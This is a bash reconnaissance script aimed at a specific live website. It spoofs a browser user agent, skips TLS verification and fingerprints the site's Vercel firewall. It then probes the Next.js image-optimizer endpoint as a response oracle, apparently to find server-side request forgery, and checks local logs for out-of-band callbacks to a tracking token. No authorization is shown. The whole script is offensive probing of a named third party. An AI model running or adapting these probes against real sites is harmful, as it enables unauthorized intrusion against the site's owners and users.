#!/bin/bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
T='https://www.infinitycapital.bh'
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
CDN='https://images.ctfassets.net'
echo "=== is the 403 the Vercel WAF checkpoint or app output? ==="
curl -sk -A "$UA" -D- -o /tmp/f403.html "$T/robots.txt" | grep -i "x-vercel\|^HTTP/\|x-matched"
grep -o '<title>[^<]*</title>' /tmp/f403.html | head -2
echo
echo "=== oracle: nonexistent path on the ALLOWED cdn host ==="
curl -sk -A "$UA" -D- -o /tmp/c404.bin "$T/_next/image?url=$(enc "$CDN/THISPATHDOESNOTEXIST12345.jpg")&w=640&q=75" \
  | grep -i "^HTTP/\|x-nextjs\|content-type\|x-matched\|x-vercel-cache"
echo "body:"; head -c 200 /tmp/c404.bin; echo
echo "=== oracle: real image on allowed host (control) ==="
curl -sk -A "$UA" -o /tmp/cok.bin -w "HTTP=%{http_code} sz=%{size_download} ct=%{content_type}\n" \
  "$T/_next/image?url=$(enc "$CDN/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg")&w=640&q=75"
head -c 20 /tmp/cok.bin | xxd | head -2
echo
echo "=== OOB registry check for my token ==="
grep -c "oob32eea4622dac" /work/oob_registry.jsonl 2>/dev/null || echo "not in registry file"
if [ -f /work/oob_interactions.jsonl ]; then
  echo "interactions for my token:"; grep "oob32eea4622dac" /work/oob_interactions.jsonl | head -5
  echo "total interaction lines: $(wc -l < /work/oob_interactions.jsonl)"
else echo "no oob_interactions.jsonl"; fi
echo DONE
